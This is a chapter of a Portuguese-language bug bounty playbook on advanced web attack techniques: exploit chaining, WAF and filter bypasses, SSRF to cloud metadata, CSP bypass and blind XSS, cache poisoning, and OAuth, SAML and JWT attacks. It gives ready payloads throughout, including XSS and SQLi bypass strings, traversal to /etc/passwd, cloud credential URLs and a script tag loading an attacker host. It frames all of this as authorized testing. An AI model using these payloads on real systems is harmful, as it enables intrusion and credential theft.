# 11 — Técnicas Avançadas, Bypasses e Cadeias de Exploração

[🏠 Início](../README.md) › [03 · Playbooks](README.md) › Técnicas Avançadas e Cadeias

**Sumário:**
- [A — Cadeias de exploração (chaining)](#a--cadeias-de-exploração-chaining-pensar-em-sistemas-não-em-bugs)
- [B — Bypass de WAF e filtros](#b--bypass-de-waf-e-filtros-por-que-o-filtro-falha)
- [C — SSRF avançado](#c--ssrf-avançado)
- [D — XSS avançado](#d--xss-avançado)
- [E — Ataques de cache (poisoning & deception)](#e--ataques-de-cache-web-cache-poisoning--deception)
- [F — Autenticação e SSO avançados](#f--autenticação-e-sso-avançados)
- [G — Bugs de segunda ordem e contexto secundário](#g--bugs-de-segunda-ordem-e-contexto-secundário)
- [H — Diferenciais de parser e confusão de componentes (a veia Orange Tsai)](#h--diferenciais-de-parser-e-confusão-de-componentes-a-veia-orange-tsai)
- [🧠 Síntese: a curva do caçador avançado](#-síntese-a-curva-do-caçador-avançado)

---

> Nível expert. Extende o [playbook de classes de bug](classes-de-bug.md) com **encadeamento de bugs**, **bypass de WAF/filtros**, e aprofundamento nas classes de maior impacto. É o que separa o caçador competente do que fecha relatórios de severidade crítica. Tudo para uso **autorizado** e com **PoC de impacto mínimo** (releia o [aviso ético](../README.md#-aviso-ético-leia-antes-de-tudo--e-releia-em-cada-fase)). Payloads são para lab/validação em escopo.

> **Atenção:** estas técnicas pressupõem que você já domina o básico de cada classe ([playbook de classes de bug](classes-de-bug.md)). Bypasses evoluem; o valor não está em decorar o payload, e sim em entender **por que o filtro falha**.

---

## A — Cadeias de exploração (chaining): pensar em sistemas, não em bugs

Os maiores payouts quase nunca vêm de um bug isolado, e sim de **cadeias**: vários bugs médios que, juntos, produzem impacto crítico (tipicamente ATO ou RCE). A mentalidade: para cada achado, pergunte *"o que isto destrava se eu combinar com outra coisa?"*.

### Padrões de cadeia clássicos

**1. Open Redirect → OAuth token theft → ATO**
- Você acha um open redirect em `/login?next=`.
- O fluxo OAuth aceita `redirect_uri` que passa por esse redirect (ou valida frouxo).
- Você monta um link que faz o `code`/token da vítima vazar para seu domínio.
- Com o token, você assume a conta → **ATO crítico**. Sozinho, o open redirect seria "informational"; na cadeia, vale o topo da tabela.

**2. Self-XSS + CSRF/login-CSRF → Stored XSS explorável**
- Um self-XSS (só afeta a própria conta) parece inútil.
- Combine com login-CSRF: você força a vítima a logar na **sua** conta (que tem o payload), ou usa um CSRF que injeta o payload na conta dela.
- O self-XSS vira XSS explorável contra terceiros.

**3. IDOR de leitura → IDOR de escrita → ATO**
- IDOR que lê o e-mail/telefone de outros (recon de objetos).
- Outro IDOR que **altera** o e-mail de recuperação sem confirmação.
- Combine: ler o ID da vítima, trocar o e-mail dela, disparar reset → **ATO**.

**4. SSRF → Cloud metadata → credenciais → pivot**
- SSRF cega confirmada via Collaborator.
- Aponte para `169.254.169.254` (IMDSv1) → credenciais temporárias da role.
- Com as credenciais, demonstre acesso (impacto mínimo!) → severidade crítica. **Nunca** pivote de verdade na infra do alvo; documente o acesso e pare.

**5. CSPT → CSRF → ação privilegiada**
- Client-Side Path Traversal redireciona uma chamada do front para outro endpoint.
- Combinado com falta de proteção CSRF nesse endpoint, vira uma ação privilegiada disparável cross-site.

**6. Subdomain takeover → cookie/session theft**
- Takeover de um subdomínio que compartilha cookies de sessão com o domínio principal (`.exemplo.com`).
- Você hospeda conteúdo que captura cookies → escalonamento sério.

### Como caçar cadeias (método)
1. **Inventarie todos os achados**, mesmo os "fracos" (self-XSS, open redirect, info leak, IDOR de leitura).
2. Para cada um, anote **o que ele dá** e **o que falta** para virar crítico.
3. Procure o **elo que falta** entre dois achados.
4. Documente a cadeia inteira no report (cada elo + o resultado final).

> **Mentalidade do playbook [C8 — ATO](classes-de-bug.md#c8-account-takeover-ato--encadeamento) levada a sério:** triagers premiam quem mostra impacto real. Uma cadeia bem narrada que termina em ATO transforma três "lows" num "critical".

---

## B — Bypass de WAF e filtros (por que o filtro falha)

WAFs e validações são barreiras, não muros. O objetivo não é "burlar por burlar", e sim entender a lacuna entre o que o filtro vê e o que o backend interpreta.

### Princípios gerais
- **Codificação/normalização divergente:** o WAF e o backend decodificam de formas diferentes (URL-encode duplo, unicode, overlong UTF-8, HTML entities).
- **Confusão de contexto:** o filtro espera HTML mas o sink é JS (ou vice-versa).
- **Parsing diferente:** o WAF parseia o request de um jeito; o app, de outro (base de request smuggling).
- **Listas incompletas:** blocklists nunca cobrem tudo; encontre a variação não listada.

### XSS — bypass de filtros
```
# Sem usar 'script' nem parênteses (filtros simplistas)
<svg onload=alert`1`>
<img src=x onerror=alert(document.domain)>
# Variação de caixa / encoding
<sCrIpT>alert(1)</sCrIpT>
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
# Quebra de atributo / handler exótico
"><body onpageshow=alert(1)>
# javascript: em sink de URL com encoding
java%0ascript:alert(1)
```

### SQLi — bypass de filtros
```sql
-- Comentários e espaços alternativos
'/**/OR/**/1=1-- -
'%09OR%091=1-- -                 -- tab no lugar de espaço
-- Caixa mista e encoding
' Or 1=1-- -
-- Concatenação para evitar palavra-chave bloqueada
' UNI/**/ON SEL/**/ECT ...
```

### Path traversal — bypass
```
....//....//etc/passwd          # filtro remove "../" uma vez
..%2f..%2fetc%2fpasswd          # url-encode
%252e%252e%252f                 # double url-encode
/var/www/../../etc/passwd       # caminho absoluto + traversal
```

### SSRF — bypass de validação de host
```
http://2130706433/              # 127.0.0.1 em decimal
http://0x7f000001/              # hexadecimal
http://127.1/                   # forma curta
http://[::1]/                   # IPv6 loopback
http://localhost.evil.com/      # se valida só "começa com http"
http://169.254.169.254\@evil/   # confusão de userinfo
# Redirect 302 do seu domínio para o destino interno (bypass de allowlist)
```

> ⚠️ Bypass que dá certo só confirma que o controle é furado; **a exploração e o impacto** ainda precisam ser demonstrados manualmente, com dano mínimo.

---

## C — SSRF avançado

### Metadados de cloud (alto valor)
```
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# GCP (header obrigatório — exige SSRF que controle headers)
http://metadata.google.internal/computeMetadata/v1/   (Metadata-Flavor: Google)
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Metadata: true)
```

### SSRF cega (blind) → exfiltração
- Confirme com Collaborator (chega DNS/HTTP?).
- Para exfiltrar dados sem retorno direto: gopher para serviços internos, ou abuse de respostas baseadas em tempo/erro.

### Gopher → serviços internos (SSRF → "RCE")
- `gopher://` permite forjar pacotes TCP arbitrários → falar com Redis, Memcached, SMTP internos.
- Ex.: escrever no Redis interno via gopher pode levar a RCE (cron, webshell) — demonstre com **impacto mínimo** e só em escopo.

### DNS rebinding
- Para alvos que resolvem o host **duas vezes** (validação e uso): um domínio seu que responde IP público na 1ª resolução e IP interno na 2ª → burla a allowlist (TOCTOU de DNS).

---

## D — XSS avançado

### Bypass de CSP (Content Security Policy)
Uma CSP forte bloqueia XSS clássico — mas CSPs mal configuradas têm brechas:
- **`unsafe-inline`/`unsafe-eval` presentes:** CSP praticamente inútil para XSS.
- **Domínios confiáveis exploráveis:** se a CSP confia num CDN com **JSONP** ou bibliotecas com gadgets, você executa via endpoint confiável.
- **`nonce` reutilizado/previsível** ou vazado no HTML.
- **`base-uri` ausente:** injeção de `<base>` redireciona scripts relativos para seu domínio.
- Ferramenta: [CSP Evaluator](https://csp-evaluator.withgoogle.com/) para achar a fraqueza rápido.

### mutation XSS (mXSS)
- O sanitizer limpa o HTML, mas o navegador **re-parseia** e "muta" o DOM, recriando o vetor.
- Comum com `innerHTML` + sanitizers que não consideram reinterpretação (ex.: dentro de `<svg>`, `<math>`, `<noscript>`, ou atributos malformados que o browser "conserta").
- É a fronteira de pesquisa de XSS — estude os writeups de bypass de DOMPurify.

### Blind XSS (payload que dispara longe de você)
- O payload é armazenado e só executa num contexto que você **não vê** (painel de admin, sistema de tickets, logs renderizados).
- Use infraestrutura que te **avisa** quando dispara: [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) (self-hosted) ou o Burp Collaborator.
- Injete em campos que um humano interno vê depois: nome, user-agent, endereço, campos de suporte.
```html
"><script src=https://SEU-XSSHUNTER></script>
```

### XSS via sinks modernos
- Frameworks (React/Vue/Angular) mitigam muito, mas `dangerouslySetInnerHTML`, `v-html`, e `bypassSecurityTrustHtml` reabrem a porta.
- Template injection no client (`{{ }}` em apps Angular antigas) → XSS/sandbox escape.

---

## E — Ataques de cache (web cache poisoning & deception)

Subexplorados e de alto impacto, atingem muitos usuários de uma vez.

### Web Cache Poisoning
- Você "envenena" a resposta cacheada injetando algo via **chave não considerada pelo cache** (unkeyed input: certos headers como `X-Forwarded-Host`, `X-Forwarded-Scheme`).
- Se o app reflete esse header e o cache serve a resposta para **todos**, seu payload (ex.: XSS, redirect) atinge todo mundo que pega o cache.
- Metodologia: identifique inputs unkeyed (Param Miner ajuda) → faça-os afetar a resposta → confirme que a resposta envenenada é cacheada e servida a outros.
- Referência: [PortSwigger — Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning) e a pesquisa de James Kettle.

### Web Cache Deception
- Você engana o cache para armazenar uma página **dinâmica e sensível** como se fosse estática.
- Ex.: `https://alvo/conta/perfil/foo.css` — o app serve o perfil do usuário, mas o cache vê `.css` e armazena → outro usuário acessa a URL e pega os dados em cache.

---

## F — Autenticação e SSO avançados

### OAuth — vetores além do básico ([playbook C5](classes-de-bug.md#c5-oauth--sso-misconfiguration))
- **`redirect_uri` com path traversal/parâmetros:** allowlist valida o domínio mas não o path → desvie para um open redirect interno.
- **Confusão de fluxos:** forçar `response_type=token` (implicit) onde só `code` era esperado.
- **`state` ausente:** account linking forçado (CSRF no OAuth) → vincular sua identidade social à conta da vítima.
- **Roubo de `code` via Referer/logs:** se o `code` vaza para terceiros antes de ser trocado.
- **Pre-account takeover:** registrar via SSO antes de a vítima confirmar o e-mail; quando ela "logar com Google", cai na sua conta.

### SAML
- **XML Signature Wrapping (XSW):** reposicionar/duplicar elementos assinados para que a assinatura valide mas o app leia o seu Assertion forjado.
- **Comentários em XML:** `admin@x.com<!---->.evil.com` — parsers que truncam em comentário podem autenticar como `admin@x.com`.
- **Assinatura não validada / `none`:** o app aceita Assertion sem verificar a assinatura.

### JWT — vetores avançados ([playbook C6](classes-de-bug.md#c6-jwt-attacks))
- **Algorithm confusion RS256→HS256:** assine com a **chave pública** (que você conhece) usada como segredo HMAC.
- **`jwk`/`jku`/`x5u` injection:** o token aponta para a chave de verificação; se o servidor confia no `jku` (URL da chave), aponte para a **sua** chave.
- **`kid` injection:** path traversal/SQLi via o header `kid` (ex.: `kid: ../../dev/null` para chave vazia/previsível).
- **Brute do segredo HMAC fraco:** offline com jwt_tool + wordlist.

---

## G — Bugs de segunda ordem e contexto secundário

Onde o input causa efeito **mais tarde** ou **em outro componente** — difíceis de achar com scanner, ótimos para o caçador atento.

### Second-order injection
- O input é **armazenado** "limpo" e usado **depois** em contexto perigoso (ex.: nome salvo no signup, usado sem escape num relatório de admin → stored XSS/SQLi de segunda ordem).
- Metodologia: rastreie **onde os dados que você controla reaparecem** pela aplicação (perfil → fatura → e-mail → painel admin).

### Secondary-context / path confusion
- Quando o front constrói paths de API (CSPT, [playbook B4](classes-de-bug.md#b4-client-side-path-traversal-cspt)) ou quando um proxy reescreve caminhos, um `../` ou um caractere especial pode mudar o endpoint efetivamente chamado.

### Host header & secondary requests
- O `Host` (ou `X-Forwarded-Host`) influencia links gerados pelo servidor (reset de senha, e-mails, cache) → poisoning de reset, cache, etc.

### Race conditions de estado complexo ([playbook C4](classes-de-bug.md#c4-race-conditions))
- Além do "resgatar 2x": condições onde múltiplas requests simultâneas levam o sistema a um **estado inconsistente** (criar dois recursos com mesma chave única, burlar verificação de limite em transferências).
- Ferramenta: Turbo Intruder com single-packet attack; estude ["Smashing the state machine"](https://portswigger.net/research/smashing-the-state-machine).

---

## H — Diferenciais de parser e confusão de componentes (a veia Orange Tsai)

A técnica de maior alavancagem do [Orange Tsai](orange-tsai-decodificado-js.md): não achar "um payload que passa", e sim achar **onde dois componentes discordam sobre o significado da mesma entrada**. Todo o cânone dele é isto — parser vs requester (SSRF 2017), proxy vs backend (path normalization 2018), módulo vs módulo (Confusion Attacks no Apache, 2024), camada Unicode vs ANSI (WorstFit). No stack JS, esses diferenciais são abundantes e mal-vigiados.

### O mapa de discordâncias no stack JS

| Onde | Componente A | Componente B | O que explora |
|---|---|---|---|
| **URL** | `new URL()` (WHATWG) / allowlist por string | `fetch`/`undici`/`axios` + redirect | [SSRF](#c--ssrf-avançado) (parser/requester, TOCTOU) |
| **Query** | `querystring` nativo / WAF | `qs` (Express: arrays/objetos aninhados) | HPP, **prototype pollution** via query, type juggling |
| **Path** | proxy/CDN (nginx) normaliza | Node (`path.normalize`, `express.static`) | path traversal, auth bypass por rota |
| **Rota/auth** | middleware (Next.js, guard) | handler / static | **bypass de auth** (ex.: `x-middleware-subrequest`, CVE-2025-29927) |
| **HTTP msg** | front (CDN/HAProxy) | `llhttp` (Node) | [request smuggling](#a7-http-request-smuggling) / desync |
| **Tipo** | código espera string | recebe array/objeto (`?x[]=`) | NoSQL injection, bypass de comparação |
| **Header de confiança** | app confia em `X-Forwarded-*`/`Host` | cache/gerador de link | cache poisoning, [host header 2ª ordem](#g--bugs-de-segunda-ordem-e-contexto-secundário) |

### Método para caçar diferenciais

1. **Enumere os parsers.** Para cada entrada (URL, path, query, header, body), pergunte: *"quem lê isto antes de mim?"* (WAF? proxy? middleware? framework? lib?).
2. **Force a discordância.** Mande a mesma entrada de formas que os dois lados interpretam diferente: encoding divergente (`%2e`, `%252e`, `..%2f`, unicode), chave duplicada, tipo trocado (`x[]=`), caractere ambíguo (`@`, `\`, `;`, `#`, tab).
3. **Observe onde os dois usos do mesmo campo se contradizem.** O bug mora na contradição — ex.: `req.query.token` lido como array num ponto e como string noutro; `req.path` checado na auth e re-derivado no handler.
4. **Escale via cadeia.** O diferencial raramente é o impacto final; é o **elo** ([seção A](#a--cadeias-de-exploração-chaining-pensar-em-sistemas-não-em-bugs)). Diferencial de rota → acesso a endpoint sem authz → BOLA; diferencial de URL → SSRF → IMDS.

### Cadeias JS-nativas (o padrão ProxyLogon aplicado ao MERN/Next)

- **Middleware bypass → BOLA:** `x-middleware-subrequest` (ou rota mal-coberta) pula a auth → API de admin sem authz redundante.
- **Prototype pollution → gadget → RCE:** PP no body → opção default que chega a `child_process`/template → RCE ([2.6](orange-tsai-decodificado-js.md#26-desserialização-e-execução--node-serialize-vm2-prototype-pollution)).
- **CSPT → CSRF → ação privilegiada:** `../` no fetch do front → endpoint sem CSRF → estado mudado como a vítima.

> Aprofundamento e fontes primárias de cada peça: [Orange Tsai Decodificado — o cânone traduzido para JS](orange-tsai-decodificado-js.md).

---

## 🧠 Síntese: a curva do caçador avançado

| Nível | O que domina |
|---|---|
| Intermediário | Acha bugs isolados de cada classe ([playbook de classes de bug](classes-de-bug.md)) com validação manual sobre recon automatizado |
| Avançado | **Encadeia** bugs, **burla** filtros entendendo o porquê, explora **contexto secundário** e **estado** |
| Pesquisador | Descobre **novas variações** e técnicas; publica research que vira a base de writeups dos outros |

> **O fio condutor de toda a edição 2026:** a máquina te dá a amplitude (todos os endpoints, rápido); o caçador intermediário valida cada classe à mão; o avançado vê as **conexões** entre achados que nenhuma ferramenta vê. Automação amplia o alcance — **encadeamento e contexto são, e seguirão sendo, humanos**.

---

> **Quase no fim do núcleo web/API.** Você percorreu: metodologia ([README](../README.md)), motor de recon com IA ([01](../01-recon/recon-engine-ia-e-automacao.md)), fases F0–F7 ([02](../02-trilha/01-fundacao-e-web-f0-f2.md)–[04](../02-trilha/03-ctf-cve-carreira-f4-f7.md)), referência ([05](../05-referencia/arsenal-labs-checklists-etica.md)), playbook por classe ([06](classes-de-bug.md)), recon avançado/contínuo + API ([07](../01-recon/recon-continuo-e-api-avancado.md)), apêndices operacionais ([08](../05-referencia/apendices.md)), cenários ponta a ponta ([09](../04-pratica/cenarios-praticos.md)), setup + cookbook de IA ([10](../05-referencia/setup-completo-e-cookbook-ia.md)) e técnicas avançadas + cadeias (este, [11](tecnicas-avancadas-e-cadeias.md)). **Faltam os capstones:** [Orange Tsai Decodificado (foco JS) — 12](orange-tsai-decodificado-js.md), a lente que reorganiza tudo isto em arquitetura/parsers/cadeias no ecossistema JavaScript, e [Caçador Manual — Autorização e Lógica — 13](manual-autorizacao-e-logica.md), a trilha de quem vive de logic flaws e BOLA/BFLA. É um mapa de anos de prática. O único passo que falta é o seu: sobe um lab, roda teu primeiro funil num alvo autorizado, lê um writeup — hoje. Boa caçada. 🎯

---

⬅️ [Anterior: Setup Completo + Cookbook de IA](../05-referencia/setup-completo-e-cookbook-ia.md) · [⬆️ Topo](#) · [Próximo: Orange Tsai Decodificado (foco JS) ➡️](orange-tsai-decodificado-js.md)
